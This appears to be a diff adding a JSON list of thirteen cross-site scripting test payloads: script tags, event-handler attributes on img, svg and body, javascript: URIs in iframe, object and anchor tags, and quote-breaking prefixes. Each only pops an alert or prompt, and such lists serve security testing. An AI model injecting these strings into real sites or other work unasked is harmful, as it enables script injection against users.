@@ -1,0 +1,17 @@
+{
+  "payloads": [
+    "'<script>alert('XSS')</script>",
+    "'<img src='x' onerror='alert(7)'>",
+    "\"><svg onload=alert(1)>",
+    "<svg onload=alert(7)>",
+    "'><script>alert('Injected')</script>",
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert(7)>",
+    "<script>prompt('XSS')</script>",
+    "<iframe src='javascript:alert(7)'></iframe>",
+    "<body onload='alert(7)'>",
+    "<script>eval('alert(7)')</script>",
+    "<object data='javascript:alert(7)'></object>",
+    "<a href='javascript:alert(7)'>Click me</a>"
+  ]
+}
